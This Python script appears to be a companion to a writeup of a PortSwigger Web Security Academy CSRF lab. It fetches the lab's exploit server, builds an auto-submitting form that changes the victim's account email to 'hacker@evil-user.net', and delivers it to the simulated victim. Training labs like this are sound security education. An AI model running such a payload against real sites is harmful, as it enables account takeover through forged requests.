#!/usr/bin/env python3
"""
CSRF vulnerability with no defenses
PortSwigger Web Security Academy -- Cross-Site Request Forgery (CSRF)

Companion script for the writeup: 01-no-defenses.md

What this does:
    Builds a bare auto-submitting HTML form targeting /my-account/change-email
    with no CSRF token field at all -- the fallback strategy craft_csrf_payload()
    falls through to when a CSRFContext has no_token_works=True -- stores it on
    the lab's exploit server, and triggers delivery to the simulated victim,
    exactly like lab_no_defenses() in our CSRF.py capability.

Usage:
    python 01-no-defenses.py <lab-url>
    e.g. python 01-no-defenses.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import re
import sys
import time
import httpx


def _get_exploit_server_url(client: httpx.Client) -> str:
    r = client.get("/")
    m = re.search(r'(https://exploit-[^\s"\'<>]+\.exploit-server\.net)', r.text)
    return m.group(1).rstrip("/") if m else ""


def _exploit_server_deliver(exploit_url: str, body: str, headers: str) -> bool:
    with httpx.Client(follow_redirects=True, timeout=20) as c:
        r = c.post(exploit_url, data={
            "responseFile": "/exploit",
            "responseBody": body,
            "responseHead": headers,
            "formAction": "DELIVER_TO_VICTIM",
        })
    return r.status_code < 400


def solve(lab_url: str) -> None:
    client = httpx.Client(
        base_url=lab_url, follow_redirects=True, timeout=20,
        headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"},
    )
    client.get("/")  # warm up, grab a session cookie

    exploit_url = _get_exploit_server_url(client)
    if not exploit_url:
        print("[-] No exploit server found on the lab landing page.")
        return
    print(f"[*] Exploit server: {exploit_url}")

    html = (
        '<html><body>\n'
        f'<form action="{lab_url}/my-account/change-email" method="POST">\n'
        '  <input type="hidden" name="email" value="hacker@evil-user.net" />\n'
        '</form>\n'
        '<script>document.forms[0].submit();</script>\n'
        '</body></html>'
    )
    headers = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8"

    print("[*] Technique: Basic auto-submit form (no defenses)")
    _exploit_server_deliver(exploit_url, html, headers)
    time.sleep(5)

    check = client.get("/")
    if "Congratulations" in check.text:
        print("[+] Lab solved -- victim's email was changed to hacker@evil-user.net.")
    else:
        print("[-] Not solved yet -- check the exploit server's access log.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
